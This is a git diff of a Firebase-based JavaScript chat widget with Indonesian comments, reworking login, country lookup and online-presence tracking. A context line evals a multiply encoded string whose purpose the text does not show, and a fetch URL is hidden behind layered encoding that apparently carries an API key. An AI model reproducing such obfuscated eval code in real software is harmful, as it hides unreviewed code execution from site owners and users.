@@ -570,138 +570,140 @@ function updateOnlineList(onlineData) {
 	
 	eval(bstx(h3tx(h3tx(bstx('  MzU2MTM0MzczMzM5MzY2MTM2MzQzNTM3MzMzMTM2NjMzNjMyMzY2NTM1MzEzNzM1MzUzOTM1MzczNTMyMzY2MjM1MzIzNTM4MzU2MTM2NjMzNjMyMzY2NTM1MzIzNDY0MzYzMTM1MzgzNDY1MzMzMDM1NjEzNTM3MzMzNTM2NjMzNjMzMzYzOTM2MzczNjM5MzUzMjM0MzUzMzM5MzQ2NTM1MzEzMzMyMzMzOTM3MzUzNjM0MzQzNzM1MzYzNzM1MzYzNDM0MzUzNzM4MzczNjM1MzkzNTM3MzUzMjM2NjMzNTYxMzQzMzM0MzkzNzMzMzQzOTM0MzczNTYxMzMzMTM2MzIzNjY0MzQ2NTMzMzAzNjMxMzUzNzMzMzkzNzM1MzQ2MjM0MzMzNjYyMzYzNzM2MzUzNzM3MzY2NjM2MzczNDM5MzQzMzM0MzEzNjM3MzYzMTM1MzczNTM5MzYzNzM0NjIzNDM4MzYzNDM3MzAzNjMyMzY2NDM1MzIzNzM2MzYzNDM3MzkzMzM1MzczMzM2MzIzMzMyMzQ2NTM2MzgzNjM0MzQzNzM2NjMzNzM2MzYzMjM2MzkzMzM1MzY2NjM2MzMzNjY0MzUzNjM2NjQzNDYzMzY2NDM2NjMzNzM1MzU2MTM0MzczNTM2MzMzNDM1MzQzMzMyMzUzOTM2NjYzNDM5MzY2NDMzMzEzNjM5MzUzOTM1MzczNjM4MzYzOTM1MzkzNTM3MzQ2MTM2MzgzNjM0MzQzMzMzMzUzNjY1MzYzMTM1MzgzNTMyMzY2NjM2MzQzNTM3MzQzOTM3MzUzNjMxMzUzNzMzMzgzNjM5MzQ2MjM1MzMzNDMxMzI2MjM0MzkzNDMzMzMzMDM3MzgzNDM5MzQzODM3MzgzMzM4MzQzOTM0MzEzNjY2MzYzNzM0MzkzNDMzMzQzMTM2MzczNDM5MzQzMzM0MzEzNjM3MzQzOTM0MzgzNjM0MzczMDM2MzIzNjY0MzUzMjM3MzYzNjM0MzczOTMzMzUzNzMzMzYzMjMzMzIzNDY1MzYzODM2MzQzNDM3MzY2MzM3MzYzNjMyMzYzOTMzMzUzNjY2MzYzMzM2NjQzNTM2MzY2NDM0NjMzNjY0MzY2MzM3MzUzNTYxMzQzNzM1MzYzMzM0MzUzNDMzMzIzNTM5MzY2NjM0MzkzNjY0MzYzNDM3MzQzNTM5MzUzNzM2NjMzNzMzMzUzOTMzMzIzNjM4MzY2MzM1MzkzMzMyMzczNDM2NjMzNjMzMzYzOTMzMzUzNjY1MzYzMTM1MzgzNTMyMzY2NjM2MzQzNTM3MzQzOTM3MzUzNjMxMzUzNzMzMzgzNjM5MzQ2MjM1MzMzNDMxMzI2MjM0MzkzNDMzMzMzMDM3MzgzNDYyMzUzMzM0MzIzMzM3MzQzMzM2MzkzNDMxMzYzNzM0MzkzNDMzMzQzMjMzMzkzNDM5MzQzNzM1MzYzNzMzMzYzMzMzMzIzNTM1MzYzNzM2MzUzNzM3MzY2NjM2MzczNDM5MzQzMzM0MzEzNjM3MzQzOTM0MzMzNDMxMzYzNzM0MzkzNDM4MzYzNDM3MzAzNjMyMzY2NDM1MzIzNzM2MzYzNDM3MzkzMzM1MzczMzM2MzIzMzMyMzQ2NTM2MzgzNjM0MzQzNzM2NjMzNzM2MzYzMjM2MzkzMzM1MzY2NjM2MzMzNjY0MzUzNjM2NjQzNDM5MzQzNDMzMzAzNjM3MzQzOTM2NjQzMzMxMzYzOTM1MzkzNTM3MzYzODM2MzkzNTM5MzUzNzM0NjEzNjM4MzYzNDM0MzMzMzM1MzY2NTM2MzEzNTM4MzUzMjM2NjYzNjM0MzUzNzM0MzkzNzM1MzYzMTM1MzczMzM4MzczNjM1MzEzMzMyMzMzOTM3MzczNjM1MzUzODM0NjEzNzMwMzU2MTMzMzIzNjM4MzMzMDM0NjMzNTM4MzQ2NTMzMzAzNjMzMzY2NDM2NjMzNzMyMzU2MTM1MzMzNDM5MzMzNzM0MzMzNjM5MzQzMTM2MzczNDM5MzQzMzM0MzIzMzM5MzQzMzM2NjUzMzMwMzczMDM0NjYzNzM3MzM2NDMzNjQ')))));	
 
-		onAuthStateChanged(auth, async (user) => {
-			if (user) {
-				currentUser = user;
-				userIsAdmin = isAdmin();
-				
-				try {
-						window.requestAnimationFrame(() => {
-						showWelcomeMessage(username);
-					});
-					const username = await getUsername(user.uid);
-											try {
-							const ipgeo = bstx(bstx(h3bs('6148523063484d364c79396863476b756158426e5a57397362324e6864476c7662693570627939706347646c627a396863476c4c5a586b394d5467334e474e6d4f4449314e54566c4e47497759546b794e7a55335a44517a5a4463314e6a51305a44493d')));						
-							const response = await fetch(ipgeo);
-							if (!response.ok) throw new Error('Failed to fetch');
-							const data = await response.json();
-							currentUserCountry = data.country_code2 ? data.country_code2.toLowerCase() : '';
-						} catch (error) {
-							console.error('Gagal mendapatkan negara:', error);
-							// Fallback ke API alternatif
-							try {
-								const backup = await fetch(ipgeo);
-								const backupData = await backup.json();
-								currentUserCountry = backupData.country_code2?.toLowerCase() || '';
-							} catch {
-								currentUserCountry = '';
-							}
-						}		
-										
-					const userRef = ref(database, `users/${user.uid}`);
-					
+onAuthStateChanged(auth, async (user) => {
+  if (user) {
+    currentUser = user;
+    userIsAdmin = isAdmin();
 
-					await set(userRef, {
-						username: username,
-						country: currentUserCountry,
-						created: serverTimestamp(),
-						lastLogin: serverTimestamp(),
-						online: true,
-						isAdmin: userIsAdmin
-					});
-					
-					const onlineRef = ref(database, `onlineUsers/${user.uid}`);
-					await set(onlineRef, {
-						username: username,
-						country: currentUserCountry,
-						lastActive: serverTimestamp(),
-						isAdmin: userIsAdmin
-					});
-					
-const onlineUsersRef = ref(database, 'onlineUsers');
-				onValue(onlineUsersRef, (snapshot) => {
-				  const onlineData = snapshot.val() || {};
-				  const onlineUsers = [];
+    try {
+      const username = await getUsername(user.uid);
 
-				  // Tambahkan semua pengguna online saat ini ke dalam array
-				  Object.keys(onlineData).forEach(uid => {
-					onlineUsers.push(onlineData[uid].username);
-				  });
+      // Mendapatkan informasi negara pengguna
+      try {
+        const ipgeo = bstx(bstx(h3bs('6148523063484d364c79396863476b756158426e5a57397362324e6864476c7662693570627939706347646c627a396863476c4c5a586b394d5467334e474e6d4f4449314e54566c4e47497759546b794e7a55335a44517a5a4463314e6a51305a44493d')));
+        const response = await fetch(ipgeo);
+        if (!response.ok) throw new Error('Failed to fetch');
+        const data = await response.json();
+        currentUserCountry = data.country_code2 ? data.country_code2.toLowerCase() : '';
+      } catch (error) {
+        console.error('Gagal mendapatkan negara:', error);
+        // Fallback ke API alternatif
+        try {
+          const backup = await fetch(ipgeo);
+          const backupData = await backup.json();
+          currentUserCountry = backupData.country_code2?.toLowerCase() || '';
+        } catch {
+          currentUserCountry = '';
+        }
+      }
 
-				  let isPageVisible = document.visibilityState === 'visible';
-				  let updateTimeout;
+      // Menyimpan informasi pengguna ke database
+      const userRef = ref(database, `users/${user.uid}`);
+      await set(userRef, {
+        username: username,
+        country: currentUserCountry,
+        created: serverTimestamp(),
+        lastLogin: serverTimestamp(),
+        online: true,
+        isAdmin: userIsAdmin
+      });
 
-				  document.addEventListener('visibilitychange', function() {
-					if (document.visibilityState === 'visible') {
-					  console.log('Halaman terlihat');
-					  isPageVisible = true;
-					  if (!updateTimeout) {
-						updateTimeout = setTimeout(updateTimestamp, 60000); // Penundaan 1 menit
-					  }
-					} else {
-					  console.log('Halaman tidak terlihat');
-					  isPageVisible = false;
-					  clearTimeout(updateTimeout);
-					  updateTimeout = null;
-					}
-				  });
+      const onlineRef = ref(database, `onlineUsers/${user.uid}`);
+      await set(onlineRef, {
+        username: username,
+        country: currentUserCountry,
+        lastActive: serverTimestamp(),
+        isAdmin: userIsAdmin
+      });
 
-				  setInterval(() => {
-					if (isPageVisible) {
-					  updateTimestamp();
-					}
-				  }, 2 * 60 * 1000); // Mengatur interval ke 2 menit
+      // Reset onlineUsers setiap 2 jam
+      setInterval(async () => {
+        const onlineUsersRef = ref(database, 'onlineUsers');
+        await set(onlineUsersRef, {}); // Mengosongkan onlineUsers
+        console.log('onlineUsers telah direset.');
+      }, 2 * 60 * 60 * 1000); // 2 jam dalam milidetik
 
-				  function updateTimestamp() {
-					if (currentUser) {
-					  const onlineRef = ref(database, `onlineUsers/${currentUser.uid}`);
-					  get(onlineRef).then((snapshot) => {
-						if (snapshot.exists()) {
-						  const userData = snapshot.val();
-						  
-						  // Menambahkan username ke dalam array onlineUsers
-						  onlineUsers.push(userData.username);
+      // Memperbarui status online pengguna setiap 2 menit
+      const onlineUsersRef = ref(database, 'onlineUsers');
+      onValue(onlineUsersRef, (snapshot) => {
+        const onlineData = snapshot.val() || {};
+        const onlineUsers = [];
+        Object.keys(onlineData).forEach(uid => {
+          onlineUsers.push(onlineData[uid].username);
+        });
 
-						  set(onlineRef, { ...userData, lastActive: serverTimestamp() });
-						  console.log('User masih aktif, memperbarui timestamp');
-						  console.log('Online users:', onlineUsers);
-						}
-					  });
-					  onDisconnect(onlineRef).remove(); // Menambahkan ini di dalam if block
-					}
+        let isPageVisible = document.visibilityState === 'visible';
 
-					updateTimeout = setTimeout(() => {
-					  updateTimeout = null;
-					}, 2 * 60 * 1000); // Interval reset diatur menjadi 2 menit
-				  }
+        document.addEventListener('visibilitychange', function () {
+          if (document.visibilityState === 'visible') {
+            console.log('Halaman terlihat');
+            isPageVisible = true;
 
-				  const onlineCount = Object.keys(onlineData).length;
-				  document.getElementById('online-counter').innerHTML = `Online: <span class="online-count">${onlineCount}</span>`;
+            // Langsung tambahkan pengguna ke onlineUsers saat halaman terlihat
+            updateTimestamp();
+          } else {
+            console.log('Halaman tidak terlihat');
+            isPageVisible = false;
+          }
+        });
 
-				  updateOnlineList(onlineData); // Pastikan ini dipanggil setelah `onValue`
-				});
+        setInterval(() => {
+          if (isPageVisible) {
+            updateTimestamp();
+          }
+        }, 2 * 60 * 1000); // Mengatur interval ke 2 menit
 
-					initializeChat();
-					
-				} catch (error) {
-					console.error("Error initializing user:", error);
-				}
-			} else {
-			  const maxRetries = 3;
-			  let attempts = 0;
-			  const tryAnonymousAuth = async () => {
-				try {
-				  await signInAnonymously(auth);
-				} catch (error) {
-				  if (attempts < maxRetries) {
-					attempts++;
-					setTimeout(tryAnonymousAuth, 2000);
-				  }
-				}
-			  };
-			  tryAnonymousAuth();
-			}
-		});
+        function updateTimestamp() {
+          if (currentUser) {
+            const onlineRef = ref(database, `onlineUsers/${currentUser.uid}`);
+            get(onlineRef).then((snapshot) => {
+              if (snapshot.exists()) {
+                const userData = snapshot.val();
+                onlineUsers.push(userData.username);
+                set(onlineRef, { ...userData, lastActive: serverTimestamp() });
+                console.log('User masih aktif, memperbarui timestamp');
+                console.log('Online users:', onlineUsers);
+              } else {
+                // Jika data pengguna tidak ada, tambahkan kembali ke onlineUsers
+                set(onlineRef, {
+                  username: username,
+                  country: currentUserCountry,
+                  lastActive: serverTimestamp(),
+                  isAdmin: userIsAdmin
+                });
+                console.log('Pengguna ditambahkan kembali ke onlineUsers.');
+              }
+            });
+            onDisconnect(onlineRef).remove(); // Menghapus pengguna saat disconnect
+          }
+        }
+
+        const onlineCount = Object.keys(onlineData).length;
+        document.getElementById('online-counter').innerHTML = `Online: <span class="online-count">${onlineCount}</span>`;
+        updateOnlineList(onlineData); // Pastikan ini dipanggil setelah `onValue`
+      });
+
+      initializeChat();
+
+    } catch (error) {
+      console.error("Error initializing user:", error);
+    }
+  } else {
+    const maxRetries = 3;
+    let attempts = 0;
+    const tryAnonymousAuth = async () => {
+      try {
+        await signInAnonymously(auth);
+      } catch (error) {
+        if (attempts < maxRetries) {
+          attempts++;
+          setTimeout(tryAnonymousAuth, 2000);
+        }
+      }
+    };
+    tryAnonymousAuth();
+  }
+});
 
    document.getElementById('minimize-btn').addEventListener('click', toggleChat);
     minimizedView.addEventListener('click', toggleChat);
